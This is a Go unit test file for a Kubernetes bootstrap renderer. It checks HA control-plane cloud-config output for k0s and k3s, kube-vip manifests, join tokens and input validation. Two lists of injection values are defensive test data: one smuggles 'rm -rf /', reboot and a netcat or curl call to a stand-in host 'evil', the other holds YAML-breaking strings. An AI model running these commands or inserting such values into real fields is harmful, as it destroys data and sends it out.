/*
Copyright 2024 The Kairos CAPI Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
implied. See the License for the specific language governing
permissions and limitations under the License.
*/

package bootstrap

import (
	"os"
	"os/exec"
	"strings"
	"testing"

	yaml "gopkg.in/yaml.v3"
)

// haCPData builds a control-plane TemplateData for the given role/distro/infra
// with a representative HA topology: a stable ControlPlaneEndpointHost (CAPV) or
// LB endpoint (CAPK), a VIP block (CAPV only), and a join token for join nodes.
func haCPData(role string, kubevirt bool) TemplateData {
	d := TemplateData{
		Role:             "control-plane",
		ControlPlaneRole: role,
		Hostname:         "kairos-cp-0",
		UserName:         "kairos",
		UserGroups:       []string{"admin"},
		IsKubeVirt:       kubevirt,
	}
	if role == "join" {
		d.JoinToken = "K10deadbeef::server:cafef00d"
	}
	if kubevirt {
		d.ControlPlaneLBEndpoint = "10.96.0.10"
		d.ManagementEndpoint = &ManagementEndpoint{
			APIServer:                 "https://mgmt.example.com:6443",
			Token:                     "mgmt-token",
			KubeconfigSecretName:      "cluster-kubeconfig",
			KubeconfigSecretNamespace: "default",
			ClusterName:               "ha-cluster",
		}
	} else {
		d.VIP = &VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"}
		d.ManagementEndpoint = &ManagementEndpoint{
			APIServer:                 "https://mgmt.example.com:6443",
			Token:                     "mgmt-token",
			KubeconfigSecretName:      "cluster-kubeconfig",
			KubeconfigSecretNamespace: "default",
			ClusterName:               "ha-cluster",
			ControlPlaneEndpointHost:  "192.168.1.240",
		}
	}
	return d
}

// TestHA_WorkerIgnoresControlPlaneRole is the render-time half of CPR-INV-1: a
// worker config carrying controlPlaneRole=init/join must NOT produce any
// control-plane HA artifact (no --cluster-init, no controller-token, no
// kube-vip). The helpers gate every HA branch on Role=="control-plane", so a
// poisoned worker config renders a plain worker. (The controller-side
// enforcement is Phase 3's CPR-INV-1; this proves the renderer does not betray
// it even if a poisoned config reaches render.)
func TestHA_WorkerIgnoresControlPlaneRole(t *testing.T) {
	for _, role := range []string{"init", "join"} {
		for _, dist := range []string{"k0s", "k3s"} {
			t.Run(role+"/"+dist, func(t *testing.T) {
				d := TemplateData{
					Role:             "worker",
					ControlPlaneRole: role, // hostile: a worker must never honor this
					UserName:         "kairos",
					WorkerToken:      "wt",
					K3sToken:         "k3t",
					K3sServerURL:     "https://server:6443",
					VIP:              &VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"},
				}
				out, err := renderForDist(dist, d)
				if err != nil {
					t.Fatalf("render: %v", err)
				}
				for _, forbidden := range []string{"--cluster-init", "controller-token", "server-token", "kube-vip.yaml"} {
					if strings.Contains(out, forbidden) {
						t.Errorf("worker with controlPlaneRole=%q must NOT render control-plane HA artifact %q", role, forbidden)
					}
				}
			})
		}
	}
}

// TestHA_InitVsSingle_K0s asserts the documented init-vs-single delta for k0s:
// init drops --single, keeps managed etcd, and emits api.sans for the endpoint.
func TestHA_InitVsSingle_K0s(t *testing.T) {
	single := haCPData("single", false)
	single.SingleNode = true
	single.VIP = nil // single never renders kube-vip
	single.ManagementEndpoint = nil
	sOut, err := RenderK0sCloudConfig(single)
	if err != nil {
		t.Fatalf("render single: %v", err)
	}
	if !strings.Contains(sOut, "- --single") {
		t.Error("k0s single must contain --single")
	}

	iOut, err := RenderK0sCloudConfig(haCPData("init", false))
	if err != nil {
		t.Fatalf("render init: %v", err)
	}
	if strings.Contains(iOut, "- --single") {
		t.Error("k0s init must NOT contain --single (managed etcd, not single-node)")
	}
	if !strings.Contains(iOut, "--config /etc/k0s/k0s.yaml") {
		t.Error("k0s init must pass --config so api.sans is honored")
	}
	if !strings.Contains(iOut, "sans:") || !strings.Contains(iOut, "- 192.168.1.240") {
		t.Error("k0s init must include the control-plane endpoint in api.sans")
	}
}

// TestHA_JoinTokenFile asserts join nodes write the token file and reference it,
// across both distributions, and that the token round-trips (no shell/YAML
// mangling of an opaque token).
func TestHA_JoinTokenFile(t *testing.T) {
	cases := []struct {
		name      string
		render    func(TemplateData) (string, error)
		tokenPath string
		serverArg string
	}{
		{"k0s_capv", RenderK0sCloudConfig, "/etc/k0s/controller-token", "--token-file=/etc/k0s/controller-token"},
		{"k3s_capv", RenderK3sCloudConfig, "/etc/rancher/k3s/server-token", "--token-file=/etc/rancher/k3s/server-token"},
		{"k0s_capk", RenderK0sCloudConfig, "/etc/k0s/controller-token", "--token-file=/etc/k0s/controller-token"},
		{"k3s_capk", RenderK3sCloudConfig, "/etc/rancher/k3s/server-token", "--token-file=/etc/rancher/k3s/server-token"},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			kv := strings.HasSuffix(tc.name, "capk")
			d := haCPData("join", kv)
			out, err := tc.render(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			if !strings.Contains(out, tc.serverArg) {
				t.Errorf("join render missing token-file arg %q", tc.serverArg)
			}
			// The token must round-trip through the rendered write_files content.
			content := extractWriteFile(t, out, tc.tokenPath)
			if content == "" {
				t.Fatalf("join render missing token file %q", tc.tokenPath)
			}
			if strings.TrimSpace(content) != d.JoinToken {
				t.Errorf("join token did not round-trip in %q: got %q want %q", tc.tokenPath, strings.TrimSpace(content), d.JoinToken)
			}
		})
	}
}

// TestHA_JoinServerURLIsEndpointNotVIP is the explicit guard for the ADR
// invariant: the k3s join --server URL is the stable ControlPlaneEndpointHost,
// NOT the VIP block (even though, in a correctly-configured cluster, the two
// values coincide). We set them to DIFFERENT values to prove which one the
// template reads.
func TestHA_JoinServerURLIsEndpointNotVIP(t *testing.T) {
	d := haCPData("join", false)
	d.ManagementEndpoint.ControlPlaneEndpointHost = "cp.example.com" // the endpoint
	d.VIP.Address = "10.10.10.10"                                    // a DIFFERENT VIP address
	out, err := RenderK3sCloudConfig(d)
	if err != nil {
		t.Fatalf("render: %v", err)
	}
	if !strings.Contains(out, "--server=https://cp.example.com:6443") {
		t.Error("k3s join --server must use ControlPlaneEndpointHost (cp.example.com)")
	}
	if strings.Contains(out, "--server=https://10.10.10.10:6443") {
		t.Error("k3s join --server must NOT use the VIP address (10.10.10.10) — VIP only drives the kube-vip manifest")
	}
}

// TestHA_KubeVIP_OnlyCAPV asserts kube-vip renders for CAPV init/join and never
// for CAPK (OQ-5) or single-node.
func TestHA_KubeVIP_OnlyCAPV(t *testing.T) {
	type want struct {
		render   func(TemplateData) (string, error)
		role     string
		kubevirt bool
		expect   bool
	}
	cases := map[string]want{
		"k0s_capv_init": {RenderK0sCloudConfig, "init", false, true},
		"k3s_capv_join": {RenderK3sCloudConfig, "join", false, true},
		"k0s_capk_init": {RenderK0sCloudConfig, "init", true, false}, // OQ-5
		"k3s_capk_join": {RenderK3sCloudConfig, "join", true, false}, // OQ-5
		"k0s_capv_single": func() want {
			return want{RenderK0sCloudConfig, "single", false, false}
		}(),
	}
	for name, c := range cases {
		c := c
		t.Run(name, func(t *testing.T) {
			d := haCPData(c.role, c.kubevirt)
			if c.role == "single" {
				d.SingleNode = true
			}
			out, err := c.render(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			has := manifest != ""
			if has != c.expect {
				t.Errorf("kube-vip manifest present=%v, want %v", has, c.expect)
			}
			if c.expect {
				// VIP-INV-2: the manifest must itself be valid YAML and a kube-vip Pod.
				var pod map[string]any
				if err := yaml.Unmarshal([]byte(manifest), &pod); err != nil {
					t.Fatalf("kube-vip manifest is not valid YAML: %v\n%s", err, manifest)
				}
				if pod["kind"] != "Pod" {
					t.Errorf("kube-vip manifest kind=%v, want Pod", pod["kind"])
				}
			}
		})
	}
}

// TestHA_KubeVIP_Mode asserts ARP vs BGP toggles the env booleans.
func TestHA_KubeVIP_Mode(t *testing.T) {
	for _, tc := range []struct {
		mode string
		arp  string
		bgp  string
	}{
		{"ARP", "true", "false"},
		{"BGP", "false", "true"},
		{"", "true", "false"}, // empty defaults to ARP
	} {
		tc := tc
		t.Run("mode="+tc.mode, func(t *testing.T) {
			d := haCPData("init", false)
			d.VIP.Mode = tc.mode
			out, err := RenderK0sCloudConfig(d)
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			env := kubeVIPEnv(t, manifest)
			if env["vip_arp"] != tc.arp {
				t.Errorf("vip_arp=%q want %q for mode %q", env["vip_arp"], tc.arp, tc.mode)
			}
			if env["bgp_enable"] != tc.bgp {
				t.Errorf("bgp_enable=%q want %q for mode %q", env["bgp_enable"], tc.bgp, tc.mode)
			}
		})
	}
}

// kubeVIPEnv parses the kube-vip Pod manifest and returns its container env as
// a name->value map.
func kubeVIPEnv(t *testing.T, manifest string) map[string]string {
	t.Helper()
	var pod struct {
		Spec struct {
			Containers []struct {
				Env []struct {
					Name  string `yaml:"name"`
					Value string `yaml:"value"`
				} `yaml:"env"`
			} `yaml:"containers"`
		} `yaml:"spec"`
	}
	if err := yaml.Unmarshal([]byte(manifest), &pod); err != nil {
		t.Fatalf("parse kube-vip manifest: %v", err)
	}
	if len(pod.Spec.Containers) == 0 {
		t.Fatalf("kube-vip manifest has no containers")
	}
	m := map[string]string{}
	for _, e := range pod.Spec.Containers[0].Env {
		m[e.Name] = e.Value
	}
	return m
}

// vipInjectionPayloads are shell/YAML-injection strings an operator could try
// to smuggle through VIP.Address / VIP.Interface. Every one must be REJECTED by
// validateVIP at render time (VIP-INV-3): none is a valid IP/hostname or
// interface name, so the render fails before any byte reaches the shell or the
// marshaled manifest.
var vipInjectionPayloads = map[string]string{
	"command substitution":  "$(rm -rf /)",
	"backtick substitution": "`reboot`",
	"semicolon":             "1.2.3.4; rm -rf /",
	"pipe":                  "1.2.3.4 | nc evil 1337",
	"ampersand background":  "1.2.3.4 & curl evil",
	"double quote":          `1.2.3.4"`,
	"single quote":          "1.2.3.4'",
	"newline":               "1.2.3.4\nrm -rf /",
	"yaml doc separator":    "1.2.3.4\n---\nevil: true",
	"yaml flow mapping":     "{evil: true}",
	"dollar brace":          "${IFS}cat",
	"all-zeros (semantic)":  "", // empty rejected explicitly below; placeholder
}

// TestVIP_Injection_Rejected asserts that an injection payload in either VIP
// field is rejected by the renderer (VIP-INV-3), for both distributions. This
// is the heart of the Phase-2 security mandate: the kube-vip block runs
// privileged on every CP node, so a malformed VIP must never reach render.
func TestVIP_Injection_Rejected(t *testing.T) {
	for name, payload := range vipInjectionPayloads {
		if payload == "" {
			continue // covered by TestVIP_EmptyAddressRejected
		}
		for _, field := range []string{"address", "interface"} {
			for _, dist := range []string{"k0s", "k3s"} {
				t.Run(name+"/"+field+"/"+dist, func(t *testing.T) {
					d := haCPData("init", false)
					switch field {
					case "address":
						d.VIP.Address = payload
					case "interface":
						d.VIP.Interface = payload
					}
					if _, err := renderForDist(dist, d); err == nil {
						t.Errorf("render with injection in VIP.%s=%q: expected error, got nil", field, payload)
					}
				})
			}
		}
	}
}

// TestVIP_EmptyAddressRejected pins the empty-address rejection.
func TestVIP_EmptyAddressRejected(t *testing.T) {
	d := haCPData("init", false)
	d.VIP.Address = ""
	if _, err := RenderK0sCloudConfig(d); err == nil {
		t.Error("empty VIP.Address must be rejected at render time")
	}
}

// TestVIP_ValidShapesAccepted asserts the canonical valid VIP shapes render.
func TestVIP_ValidShapesAccepted(t *testing.T) {
	cases := []struct {
		name string
		vip  VIPConfig
	}{
		{"ipv4 ARP", VIPConfig{Address: "192.168.1.240", Interface: "eth0", Mode: "ARP"}},
		{"ipv6 BGP", VIPConfig{Address: "2001:db8::1", Interface: "ens3", Mode: "BGP"}},
		{"hostname empty-mode", VIPConfig{Address: "cp.example.com", Interface: "bond0", Mode: ""}},
		{"bonded vlan iface", VIPConfig{Address: "10.0.0.5", Interface: "bond0.100", Mode: "ARP"}},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			d := haCPData("init", false)
			d.VIP = &tc.vip
			d.ManagementEndpoint.ControlPlaneEndpointHost = "cp.example.com"
			out, err := RenderK0sCloudConfig(d)
			if err != nil {
				t.Fatalf("render with valid VIP %+v: %v", tc.vip, err)
			}
			manifest := extractWriteFile(t, out, "kube-vip.yaml")
			env := kubeVIPEnv(t, manifest)
			// VIP-INV-2 round-trip: the address/interface land in the manifest
			// env verbatim (yaml.v3 quoting envelope) — never mangled.
			if env["address"] != tc.vip.Address {
				t.Errorf("address did not round-trip: got %q want %q", env["address"], tc.vip.Address)
			}
			if env["vip_interface"] != tc.vip.Interface {
				t.Errorf("interface did not round-trip: got %q want %q", env["vip_interface"], tc.vip.Interface)
			}
		})
	}
}

// TestVIP_AdversarialInterface_BehindRegex documents that even if the
// interface-name regex were widened in future, the renderer marshals via
// yaml.v3 so a metachar can never break out of the env scalar. We cannot pass
// the regex with metachars today (they are rejected — see
// TestVIP_Injection_Rejected), so this asserts the marshaling envelope directly
// at the kubeVIPManifest level with a deliberately hostile value.
func TestVIP_ManifestMarshalEnvelopeHolds(t *testing.T) {
	hostile := []string{
		`evil: true`,
		`"; rm -rf /; echo "`,
		"$(reboot)",
		"---\nevil: true",
		"-leadingdash",
		"#hash",
		"with space",
	}
	for _, h := range hostile {
		h := h
		t.Run(h, func(t *testing.T) {
			// Call kubeVIPManifest directly (bypassing validateVIP) to prove the
			// YAML marshaling envelope (VIP-INV-2) holds regardless of the value.
			out, err := kubeVIPManifest(&VIPConfig{Address: h, Interface: h, Mode: "ARP"})
			if err != nil {
				t.Fatalf("kubeVIPManifest: %v", err)
			}
			var pod map[string]any
			if err := yaml.Unmarshal([]byte(out), &pod); err != nil {
				t.Fatalf("kube-vip manifest not valid YAML with hostile value %q: %v\n%s", h, err, out)
			}
			env := kubeVIPEnv(t, out)
			if env["address"] != h {
				t.Errorf("hostile address did not round-trip inside YAML envelope: got %q want %q", env["address"], h)
			}
			if env["vip_interface"] != h {
				t.Errorf("hostile interface did not round-trip inside YAML envelope: got %q want %q", env["vip_interface"], h)
			}
		})
	}
}

// TestHA_RenderedScriptsValidBash runs `bash -n` on the post-bootstrap script of
// every HA render so a join/init-induced shell regression is caught at unit
// time (the script bodies only execute at node boot).
func TestHA_RenderedScriptsValidBash(t *testing.T) {
	bashPath, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("bash not available; skipping rendered-script syntax check")
	}
	cases := []struct {
		name   string
		render func(TemplateData) (string, error)
		role   string
		kv     bool
		script string
	}{
		{"k0s_capv_init", RenderK0sCloudConfig, "init", false, "kairos-k0s-post-bootstrap.sh"},
		{"k0s_capv_join", RenderK0sCloudConfig, "join", false, "kairos-k0s-post-bootstrap.sh"},
		{"k3s_capv_init", RenderK3sCloudConfig, "init", false, "kairos-k3s-post-bootstrap.sh"},
		{"k3s_capv_join", RenderK3sCloudConfig, "join", false, "kairos-k3s-post-bootstrap.sh"},
		{"k0s_capk_join", RenderK0sCloudConfig, "join", true, "kairos-k0s-post-bootstrap.sh"},
		{"k3s_capk_join", RenderK3sCloudConfig, "join", true, "kairos-k3s-post-bootstrap.sh"},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			out, err := tc.render(haCPData(tc.role, tc.kv))
			if err != nil {
				t.Fatalf("render: %v", err)
			}
			script := extractWriteFile(t, out, tc.script)
			if script == "" {
				t.Fatalf("post-bootstrap script %q not found", tc.script)
			}
			f := filepathJoinTemp(t, strings.ReplaceAll(tc.name, "/", "_")+".sh")
			if err := os.WriteFile(f, []byte(script), 0o600); err != nil {
				t.Fatalf("write temp script: %v", err)
			}
			if outBytes, err := exec.Command(bashPath, "-n", f).CombinedOutput(); err != nil {
				t.Fatalf("bash -n on rendered %s failed: %v\n%s", tc.name, err, outBytes)
			}
		})
	}
}
